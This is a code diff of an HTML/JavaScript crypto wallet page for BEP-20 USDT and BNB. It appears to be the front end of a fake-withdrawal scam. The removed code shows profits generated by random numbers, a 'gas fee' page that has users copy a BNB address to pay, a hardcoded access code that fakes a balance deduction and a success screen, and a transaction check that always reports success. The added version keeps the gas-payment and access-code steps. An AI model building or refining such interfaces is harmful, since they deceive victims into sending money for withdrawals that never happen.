+    statusId.innerText = `Manual Wallet Connected: ${manualAddress}`;
+    updateConnectedWalletDisplay();
+    updateBalancesDisplay();
+    showPage('page4');
+  }
+  function disconnectWallet() {
+    localStorage.removeItem("connectedWallet");
+    updateConnectedWalletDisplay();
+    updateBalancesDisplay();
+    alert("Wallet disconnected.");
+  }
+  function logout() {
+    localStorage.clear();
+    alert("Logged out.");
+    showPage('page1');
+  }
+  function updateConnectedWalletDisplay() {
+    const wallet = localStorage.getItem("connectedWallet");
+    const displayElems = [
+      document.getElementById('connectedWalletDisplayHomepage'),
+      document.getElementById('walletDisplay'),
+      document.getElementById('walletInfo'),
+      document.getElementById('walletConnectionStatus')
+    ];
+    displayElems.forEach(elem => {
+      if (elem) elem.innerText = wallet ? wallet : '';
+    });
+  }
+
+  // === Balance Update ===
+  async function updateBalancesDisplay() {
+    const wallet = localStorage.getItem("connectedWallet");
+    if (!wallet) {
+      document.getElementById("usdtBalance").innerText = "0.00";
+      document.getElementById("bnbBalance").innerText = "0.0000";
+      document.getElementById("totalAssetsDisplay").innerText = "$0.00";
+      return;
+    }
+    try {
+      const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+      const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+      const usdtAbi = [
+        "function balanceOf(address owner) view returns (uint256)",
+        "function decimals() view returns (uint8)"
+      ];
+      const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
+      const balance = await usdtContract.balanceOf(wallet);
+      const decimals = await usdtContract.decimals();
+      const usdtBalance = (balance / 10 ** decimals).toFixed(2);
+      document.getElementById("usdtBalance").innerText = usdtBalance;
+
+      const bnbBalance = await provider.getBalance(wallet);
+      const bnbFormatted = ethers.formatEther(bnbBalance);
+      document.getElementById("bnbBalance").innerText = parseFloat(bnbFormatted).toFixed(4);
+
+      const usdtValue = parseFloat(usdtBalance) || 0;
+      const bnbValue = parseFloat(bnbFormatted) * 240; // example BNB price
+      document.getElementById("totalAssetsDisplay").innerText = `$${(usdtValue + bnbValue).toFixed(2)}`;
+    } catch (err) {
+      console.error("Balance update error:", err);
     }
   }
 
-  async function loadBalances() {
-    if (typeof window.ethereum === 'undefined') return;
-    await switchToBSC();
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const signer = await provider.getSigner();
-    const address = await signer.getAddress();
-    const rawBNB = await provider.getBalance(address);
-    bnbBalance = parseFloat(ethers.formatEther(rawBNB));
-    document.getElementById('bnbBalance').innerText = bnbBalance.toFixed(4);
+  // === Page 6: Submit Transaction ===
+  async function submitTransaction() {
+    const hash = document.getElementById("txHash").value.trim();
+    const status = document.getElementById("txStatus");
 
-    const usdtContract = new ethers.Contract(usdtAddress, usdtABI, provider);
-    const usdtRaw = await usdtContract.balanceOf(address);
-    const decimals = await usdtContract.decimals();
-    usdtBalance = parseFloat(ethers.formatUnits(usdtRaw, decimals));
-    document.getElementById('usdtBalance').innerText = usdtBalance.toFixed(2);
-    document.getElementById('totalAssetsDisplay').innerText = `$${usdtBalance.toFixed(2)}`;
+    if (!hash || !/^0x([A-Fa-f0-9]{64})$/.test(hash)) {
+      status.innerText = "Invalid transaction hash.";
+      status.style.color = "red";
+      return;
+    }
+
+    try {
+      const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+      const receipt = await provider.getTransactionReceipt(hash);
+
+      if (!receipt) {
+        status.innerText = "Transaction not found. Please wait for confirmation.";
+        status.style.color = "orange";
+        return;
+      }
+
+      status.innerText = "✅ Transaction Confirmed!";
+      status.style.color = "limegreen";
+
+      updateBalancesDisplay();
+
+    } catch (err) {
+      console.error(err);
+      status.innerText = "Error verifying transaction.";
+      status.style.color = "red";
+    }
   }
 
-  function updateBalances() {
-    document.getElementById('usdtBalance').innerText = usdtBalance.toFixed(2);
-    document.getElementById('bnbBalance').innerText = bnbBalance.toFixed(4);
-    document.getElementById('totalAssetsDisplay').innerText = '$' + usdtBalance.toFixed(2);
-  }
-
-  function updateDailyProgress(val) {
-    dailyProgressValue = val;
-    const percent = Math.min(100, (dailyProgressValue / dailyGoal) * 100);
-    document.getElementById('dailyProgress').innerText = `$${dailyProgressValue.toFixed(2)} (${percent.toFixed(0)}%)`;
-    document.getElementById('goalBar').style.width = percent + '%';
-  }
-
+  // === Page 8: Transfer Helpers ===
   function setMaxAmount() {
-    document.getElementById('transferAmount').value = usdtBalance.toFixed(2);
-    document.getElementById('gasFeeDisplay').innerText = '0.09490 BNB';
+    // For demo, set max to 1000
+    document.getElementById("transferAmount").value = 1000;
+    document.getElementById("gasFee").innerText = "0.09490 BNB";
+  }
+  function goToBNBGasConfirmationPage(pageId) {
+    // Basic validation
+    const walletAddr = document.getElementById("inputWallet").value.trim();
+    const network = document.getElementById("networkSelect").value;
+    const amount = document.getElementById("transferAmount").value;
+    if (!walletAddr || !walletAddr.startsWith("0x") || walletAddr.length !== 42) {
+      alert("Invalid recipient wallet address.");
+      return;
+    }
+    if (!network) {
+      alert("Please select a network.");
+      return;
+    }
+    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
+      alert("Please enter a valid amount.");
+      return;
+    }
+    showPage(pageId);
   }
 
-  function goToBNBConfirmationPage() {
-    const amount = parseFloat(document.getElementById('transferAmount').value);
-    const walletAddr = document.getElementById('inputWallet').value.trim();
-    const network = document.getElementById('networkSelect').value;
-    if (!walletAddr || walletAddr.length !== 42 || !walletAddr.startsWith('0x')) return alert('Invalid wallet address');
-    if (!network) return alert('Please select a network');
-    if (isNaN(amount) || amount <= 0) return alert('Enter valid amount');
-    if (amount > usdtBalance) return alert('Insufficient USDT balance');
-    showPage(bnbBalance < 0.0949 ? 'page9i' : 'page9ii');
-  }
-
+  // === Page 9i: Copy BNB Address ===
   function copyBNBAddress() {
-    const addrText = document.getElementById('bnbAddressSection').innerText;
-    navigator.clipboard.writeText(addrText).then(() => alert('BNB address copied to clipboard.'));
+    const addr = document.getElementById("bnbAddressSection").innerText;
+    navigator.clipboard.writeText(addr).then(() => {
+      alert("BNB address copied to clipboard!");
+    });
   }
 
+  // === Page 9ii: Validate Access Code ===
   function validateAccessCode() {
-    const code = document.getElementById('accessCodeInput').value.trim();
-    if (!code) return alert('Please enter the access code.');
+    const code = document.getElementById("accessCodeInput").value.trim();
+    if (!code) {
+      alert("Please enter the access code.");
+      return;
+    }
     showPage('page10');
+    // Simulate processing delay
     setTimeout(() => {
-      if (code === 'BNBDev467') {
-        const amount = parseFloat(document.getElementById('transferAmount').value);
-        usdtBalance = Math.max(0, usdtBalance - amount);
-        bnbBalance = Math.max(0, bnbBalance - 0.0949);
-        updateBalances();
-        setTimeout(() => {
-          showSuccessPage(amount, document.getElementById('inputWallet').value.trim());
-        }, 3500);
+      if (code === "123456") {
+        alert("Access code accepted! Proceeding...");
+        showPage('page4');
       } else {
         showPage('page11');
       }
-    }, 1500);
+    }, 2000);
+  }
+  
+  // === Helper to open transfer pages from tokens ===
+  function openTransferPage(token) {
+    // For demo, just open page 8 and prefill token (not implemented)
+    showPage('page8');
+  }
+  
+// === Page 10: Transaction Processing ===
+function showProcessingPage() {
+  showPage('page10');
+  // Simulate verification delay (e.g., access code verification or tx processing)
+  setTimeout(() => {
+    // For demo: after 3 seconds, assume success and go to homepage
+    showPage('page4');
+    alert("Transaction processed successfully!");
+    updateBalancesDisplay();
+  }, 3000);
+}
+
+// === Page 11: Transaction Declined ===
+// No specific function needed as it's a static error page with buttons to retry or return to homepage.
+
+// === Page 12: Settings Functions ===
+function disconnectWallet() {
+  localStorage.removeItem('connectedWallet');
+  updateConnectedWalletDisplay();
+  updateBalancesDisplay();
+  alert("Wallet disconnected.");
+}
+
+function logout() {
+  localStorage.clear();
+  alert("You have been logged out.");
+  showPage('page1'); // Redirect to Sign In page
+}
+
+function connectWallet() {
+  const statusId = document.getElementById('walletDisplay') || document.getElementById('walletConnectionStatus') || document.getElementById('walletInfo');
+  if (!statusId) return;
+  
+  if (typeof window.ethereum === 'undefined') {
+    statusId.innerText = "MetaMask not available";
+    return;
   }
 
-  function showSuccessPage(amount, receiverAddress) {
-    const page = document.getElementById('page10');
-    page.innerHTML = `
-      <h2 style="color:#2ecc71;">✅ Transaction Successful</h2>
-      <p><strong>Withdrawn Amount:</strong> ${amount.toFixed(2)} USDT</p>
-      <p><strong>Receiver Address:</strong> ${receiverAddress}</p>
-      <p><strong>Network:</strong> Binance Smart Chain (BEP-20)</p>
-      <p><strong>From Contract Address:</strong> ${usdtAddress}</p>
-      <button onclick="showPage('page4')" style="margin-top:24px;">Back to Homepage</button>
-    `;
-    showPage('page10');
-  }
-
-  function submitTransaction() {
-    const txHash = document.getElementById('txHash').value.trim();
-    if (!txHash) return alert('Please enter a transaction hash.');
-    const statusDiv = document.getElementById('txStatus');
-    statusDiv.style.color = '#2ecc71';
-    statusDiv.innerText = 'Transaction confirmed successfully!';
-  }
-
-  function openLiveChat() {
-    window.open('https://widget-page.smartsupp.com/widget/3ab3e4c3fcd21f84344cc872db2a35d9e40245a6', '_blank');
-  }
-
-  function connectWallet() {
-    if (!window.ethereum) return alert('MetaMask or compatible wallet not found');
-    window.ethereum.request({ method: 'eth_requestAccounts' })
-      .then(accounts => {
-        connectedWallet = accounts[0];
-        localStorage.setItem('connectedWallet', connectedWallet);
-        alert('Wallet connected: ' + connectedWallet);
-        updateWalletDisplay();
-        showPage('page4');
-      })
-      .catch(err => alert('Wallet connection failed: ' + err.message));
-  }
-
-  function disconnectWallet() {
-    connectedWallet = null;
-    localStorage.removeItem('connectedWallet');
-    updateWalletDisplay();
-    alert('Wallet disconnected.');
-  }
-
-  function manualWalletConnect() {
-    const input = document.getElementById('manualWallet') || document.getElementById('manualWalletInput');
-    const address = input?.value.trim();
-    if (address && address.length === 42 && address.startsWith('0x')) {
-      connectedWallet = address;
-      localStorage.setItem('connectedWallet', connectedWallet);
-      alert('Manual wallet connected: ' + connectedWallet);
-      updateWalletDisplay();
-      showPage('page4');
-    } else {
-      alert('Invalid wallet address');
+  const provider = new ethers.BrowserProvider(window.ethereum);
+  provider.send("eth_requestAccounts", []).then(accounts => {
+    if (!accounts.length) {
+      statusId.innerText = "No wallet accounts found.";
+      return;
     }
-  }
-
-  function updateWalletDisplay() {
-    const shortAddr = connectedWallet ? connectedWallet.slice(0, 6) + '...' + connectedWallet.slice(-4) : '';
-    document.getElementById('walletInfo')?.innerText = connectedWallet ? `Connected Wallet: ${shortAddr}` : '';
-    document.getElementById('walletConnectionStatus')?.innerText = connectedWallet ? `Connected Wallet: ${shortAddr}` : '';
-    document.getElementById('connectedWalletDisplayHomepage')?.innerText = connectedWallet ? `Wallet: ${shortAddr}` : '';
-    const disconnectBtn = document.querySelector('#page12 button[onclick="disconnectWallet()"]');
-    if (disconnectBtn) {
-      disconnectBtn.disabled = !connectedWallet;
-      disconnectBtn.style.opacity = connectedWallet ? '1' : '0.5';
-    }
-  }
-
-  function logout() {
-    localStorage.clear();
-    connectedWallet = null;
-    updateWalletDisplay();
-    alert('You have been logged out.');
-    showPage('page1');
-  }
-
-  window.addEventListener('DOMContentLoaded', () => {
-    const savedWallet = localStorage.getItem('connectedWallet');
-    if (savedWallet) {
-      connectedWallet = savedWallet;
-      updateWalletDisplay();
-      loadBalances();
-    }
-    updateBalances();
-    updateDailyProgress(0);
-    setInterval(() => {
-      const newVal = dailyProgressValue + Math.random() * 10;
-      updateDailyProgress(newVal > dailyGoal ? dailyGoal : newVal);
-      addChartData(dailyProgressValue);
-    }, 5000);
-    const lastPage = localStorage.getItem('currentPage') || 'page1';
-    showPage(lastPage);
+    const walletAddress = accounts[0];
+    localStorage.setItem("connectedWallet", walletAddress);
+    statusId.innerText = `Connected Wallet: ${walletAddress}`;
+    updateConnectedWalletDisplay();
+    updateBalancesDisplay();
+    showPage('page4');
+  }).catch(err => {
+    console.error(err);
+    statusId.innerText = "Failed to connect wallet.";
   });
+}
 
-  function addChartData(value) {
-    const ctx = document.getElementById('profitChart')?.getContext('2d');
-    if (!ctx) return;
-    const chart = Chart.getChart(ctx.canvas);
-    if (!chart) return;
-    const time = new Date().toLocaleTimeString();
-    chart.data.labels.push(time);
-    chart.data.datasets[0].data.push(value);
-    if (chart.data.labels.length > 20) {
-      chart.data.labels.shift();
-      chart.data.datasets[0].data.shift();
-    }
-    chart.update();
+function manualWalletConnect() {
+  const manualInput = document.getElementById('manualWallet') || document.getElementById('manualWalletInput');
+  const statusId = document.getElementById('walletDisplay') || document.getElementById('walletConnectionStatus') || document.getElementById('walletInfo');
+  if (!manualInput || !statusId) return;
+
+  const manualAddress = manualInput.value.trim();
+  if (!manualAddress || !manualAddress.startsWith("0x") || manualAddress.length !== 42) {
+    statusId.innerText = "Invalid wallet address.";
+    return;
   }
-</script>
-    
-</html>  
+  localStorage.setItem("connectedWallet", manualAddress);
+  statusId.innerText = `Manual Wallet Connected: ${manualAddress}`;
+  updateConnectedWalletDisplay();
+  updateBalancesDisplay();
+  showPage('page4');
+}
 
+// === Page 13: Connect Wallet ===
+// Reuses connectWallet() and manualWalletConnect() from above
+
+// === Utility function: update connected wallet display (used across pages) ===
+function updateConnectedWalletDisplay() {
+  const wallet = localStorage.getItem("connectedWallet");
+  const displayElems = [
+    document.getElementById('connectedWalletDisplayHomepage'),
+    document.getElementById('walletDisplay'),
+    document.getElementById('walletInfo'),
+    document.getElementById('walletConnectionStatus')
+  ];
+  displayElems.forEach(elem => {
+    if (elem) elem.innerText = wallet ? wallet : "No wallet connected";
+  });
+}
+
+// === Utility function: show page by id ===
+function showPage(pageId) {
+  document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+  const page = document.getElementById(pageId);
+  if (page) page.style.display = 'block';
+}
+
+// On initial load, show the Sign In page or Homepage if wallet connected
+document.addEventListener("DOMContentLoaded", () => {
+  if (localStorage.getItem("connectedWallet")) {
+    showPage('page4'); // Homepage
+    updateConnectedWalletDisplay();
+    updateBalancesDisplay();
+  } else {
+    showPage('page1'); // Sign In
+  }
+});
+</script>
+
+</body>
+</html>
